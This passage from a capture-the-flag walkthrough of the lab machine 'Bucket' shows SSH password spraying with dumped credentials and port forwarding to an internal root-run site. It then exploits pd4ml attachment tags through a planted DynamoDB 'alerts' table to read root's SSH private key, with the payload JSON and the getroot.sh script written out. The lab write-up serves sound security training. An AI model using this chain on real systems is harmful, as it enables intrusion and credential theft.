                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">]</span>,
    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
<span style="color:#f92672">}</span>
</code></pre></div><p>I&rsquo;ll keep those credentials.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh <span style="color:#e6db74">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Welcome123! Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh roy@10.10.10.212
roy@10.10.10.212&#39;s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  System load:                      0.02
  Usage of /:                       33.8% of 17.59GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ 
</code></pre></div><p>The user flag is done here.</p>
<p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Running WinPEAS discovers another service currently running on port 8000.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
</code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ls -la
total <span style="color:#ae81ff">856</span>
drwxr-x---+  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.lock
drwxr-x---+  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:38 files
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">17222</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> index.php
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">808729</span> Jun <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> pd4ml_demo.jar
drwxr-x---+ <span style="color:#ae81ff">10</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 vendor
</code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">127.0.0.1:8000</span><span style="color:#f92672">&gt;</span> # unknown
        <span style="color:#f92672">&lt;IfModule</span> <span style="color:#960050;background-color:#1e0010">mpm_itk_module</span><span style="color:#f92672">&gt;</span>
                AssignUserId root root
        <span style="color:#f92672">&lt;/IfModule&gt;</span>
        DocumentRoot /var/www/bucket-app
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # bucket.htb
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # s3.bucket.htb 

        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <span style="color:#f92672">&lt;Proxy</span> <span style="color:#960050;background-color:#1e0010">*</span><span style="color:#f92672">&gt;</span>
                 Order deny,allow
                 Allow from all
         <span style="color:#f92672">&lt;/Proxy&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
</code></pre></div><h4 id="internal-web">Internal Web</h4>
<p>I&rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ~C
ssh&gt; -L 8000:127.0.0.1:8000
Forwarding port.
roy@bucket:/var/www/bucket-app$
</code></pre></div><p>The website page says the site is under construction.</p>
<p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
</p>
<h4 id="source-code-review">Source Code Review</h4>
<p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php 

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e"># POST action=get_alerts </span>
                date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
                $client <span style="color:#f92672">=</span> new DynamoDbClient<span style="color:#f92672">([</span>  <span style="color:#75715e"># Connect to DynamoDB.</span>
                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                <span style="color:#f92672">])</span>;
                
                $iterator <span style="color:#f92672">=</span> $client-&gt;getIterator<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Scan&#39;</span>, array<span style="color:#f92672">(</span> <span style="color:#75715e"># Read content from table alerts</span>
                        <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;alerts&#39;</span>,
                        <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title</span>
                        <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=</span>&gt;array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#34;Ransomware&#34;</span><span style="color:#f92672">))</span>,
                <span style="color:#f92672">))</span>;

                foreach <span style="color:#f92672">(</span>$iterator as $item<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  <span style="color:#75715e"># </span>
                        $name<span style="color:#f92672">=</span>rand<span style="color:#f92672">(</span>1,10000<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html </span>
                        file_put_contents<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;files/&#39;</span>.$name,$item<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">])</span>; <span style="color:#75715e"># Write contents to randomnumber.html</span>
                <span style="color:#f92672">}</span>
                passthru<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span>$name<span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span><span style="color:#f92672">)</span>; <span style="color:#75715e"># convert randomnumber.html to result.pdf</span>
        <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">else</span>
<span style="color:#f92672">{</span>
?&gt;
...&lt;SNIP&gt;...
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>When there is a POST request contains data of <code>action=get_alerts</code>, the site will create a connection to DynamoDB.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;POST&#34;</span>) {
        <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;action&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span>) { <span style="color:#75715e"># POST action=get_alerts 
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;America/New_York&#39;</span>);
                $client <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DynamoDbClient</span>([  <span style="color:#75715e"># Connect to DynamoDB.
</span><span style="color:#75715e"></span>                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                ]);
</code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
<blockquote>
<p>DynamoDB is key-value NoSQL database.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$iterator <span style="color:#f92672">=</span> $client<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getIterator</span>(<span style="color:#e6db74">&#39;Scan&#39;</span>, <span style="color:#66d9ef">array</span>( <span style="color:#75715e"># Read content from table alerts
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;alerts&#39;</span>,
       <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;Ransomware&#34;</span>)),
));
</code></pre></div><p>For each result, it writes the result value ($item[“data”]) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($iterator <span style="color:#66d9ef">as</span> $item) {  <span style="color:#75715e"># 
</span><span style="color:#75715e"></span>        $name<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html 
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;files/&#39;</span><span style="color:#f92672">.</span>$name,$item[<span style="color:#e6db74">&#34;data&#34;</span>]); <span style="color:#75715e"># Write contents to randomnumber.html
</span><span style="color:#75715e"></span>}
</code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">passthru</span>(<span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span style="color:#e6db74">$name</span><span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span>); <span style="color:#75715e"># convert randomnumber.html to result.pdf
</span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
<p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)</p>
<blockquote>
<p>*The web application is currently running as root</p>
</blockquote>
<h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
<p>First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.</p>
<p><code>test-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
	<span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>: 
	[
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span> }
	],
	<span style="color:#f92672">&#34;KeySchema&#34;</span>: 
	[ 
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span> }
	],
	<span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> : 
		{ <span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span> }
}
</code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and specify the JSON file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableDescription&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;AttributeDefinitions&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;AttributeType&#34;</span>: <span style="color:#e6db74">&#34;S&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;KeySchema&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;KeyType&#34;</span>: <span style="color:#e6db74">&#34;HASH&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableStatus&#34;</span>: <span style="color:#e6db74">&#34;ACTIVE&#34;</span>,
        <span style="color:#e6db74">&#34;CreationDateTime&#34;</span>: <span style="color:#e6db74">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
...&lt;SNIP&gt;...
</code></pre></div><p>I can confirm the table has been created using the subcommand <code>list-tables</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;users&#34;</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><blockquote>
<p>I can also insert items to the table, but I&rsquo;ll skip it here. Detailed notes are available on my GitHub.</p>
</blockquote>
<p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
<p><code>alert-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
        <span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;alerts&#34;</span>,
        <span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>}
        ],
        <span style="color:#f92672">&#34;KeySchema&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;RANGE&#34;</span>}
        ],
        <span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> :
        {<span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span>}
}
</code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm">source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
<p><code>payload.json</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;title&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Ransomware&#34;</span> }, 
    <span style="color:#f92672">&#34;data&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> }
}
</code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
<p><code>getroot.sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
echo <span style="color:#e6db74">&#34;[+] Create table&#34;</span>
aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Insert item&#34;</span>
aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Send get alerts&#34;</span>
curl -svd <span style="color:#e6db74">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span style="color:#75715e"># The port 8000 on Bucket forwarded to localhost:8000</span>
</code></pre></div><blockquote>
<p>The script assume all the required files are stored in the same folder.</p>
</blockquote>
<p>I’ll watch the result.pdf at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 2; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ ./getroot.sh  

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Create table
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Insert item
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send get alerts
*   Trying 127.0.0.1:8000...
* TCP_NODELAY set
* Connected to 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
&gt; POST / HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.66.0
&gt; Accept: */*
&gt; Content-Length: <span style="color:#ae81ff">17</span>
&gt; Content-Type: application/x-www-form-urlencoded
&gt; 
* upload completely sent off: <span style="color:#ae81ff">17</span> out of <span style="color:#ae81ff">17</span> bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
&lt; Date: Thu, <span style="color:#ae81ff">22</span> Apr <span style="color:#ae81ff">2021</span> 20:04:14 GMT
&lt; Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
&lt; Content-Length: <span style="color:#ae81ff">0</span>
&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
&lt; 
* Connection <span style="color:#75715e">#0 to host 127.0.0.1 left intact</span>
</code></pre></div><p>On <code>roy</code> shell, I can see it captured the ssh key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...&lt;SNIP&gt;...
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>The full process as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
</p>
<p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
